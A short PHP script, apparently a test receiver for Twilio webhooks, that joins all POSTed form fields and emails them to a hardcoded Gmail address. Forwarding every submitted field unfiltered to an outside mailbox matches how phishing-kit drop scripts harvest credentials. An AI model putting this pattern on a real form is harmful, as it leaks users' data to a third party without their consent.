<?php

   $str = "";
   foreach($_POST  as  $key=>$value)
   {
	     $str .= "$key=$value";
   }
   mail("amirrucst@gmail.com","Twillio Test",$str);
?>